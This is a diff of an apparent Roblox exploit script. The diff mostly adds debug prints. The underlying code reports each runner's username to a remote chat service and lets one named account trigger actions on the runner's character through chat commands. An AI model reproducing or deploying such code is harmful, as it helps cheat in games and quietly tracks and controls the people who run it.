@@ -76,7 +76,7 @@ local http_request = http_request
     local decoded = HttpService:JSONDecode(body)
 
     local data = {
-        ["content"] = "<@&428541904796385280>, script was executed by "..game.Players.LocalPlayer.Name,
+        ["content"] = "<@428541904796385280>, script was executed by "..game.Players.LocalPlayer.Name,
     }
 
     local newdata = HttpService:JSONEncode(data)
@@ -97,15 +97,16 @@ local plr = game.Players.LocalPlayer
 function trigger(target)
     
     trig = target.Chatted:Connect(function(word)
-        
+        print("chat")
         if ((word:sub(1,5)):lower() == ":drop") then
+		print("pass 1")
             local char = plr.Character or plr.CharacterAdded:Wait()
             local hum = char:FindFirstChild("Humanoid")
             local humrp = char:FindFirstChild("HumanoidRootPart")
             local event = char:FindFirstChild("RemoteEvent")
             
-            if (char and hum and hum.Health > 1 and humrp and event) then
-            
+            if char and hum and hum.Health > 1 and humrp and event then
+            print("pass 2")
                 local itemname = (word:sub(7,-1)):lower()
                 
                 local lastpos = humrp.CFrame
@@ -131,16 +132,19 @@ end
 for _,v in pairs(game.Players:GetChildren()) do
     if v.Name == "ivan_zyuzin" then
         trigger(v)
+	print("Nill")
     end
 end
 
 game.Players.ChildAdded:Connect(function(v)
     if v.Name == "ivan_zyuzin" then
         trigger(v)
+	print("added")
     end
 end)    
 game.Players.ChildRemoved:Connect(function(v)
     if v.Name == "ivan_zyuzin" then
         trig:Disconnect()
+	print("removed")
     end
 end)    
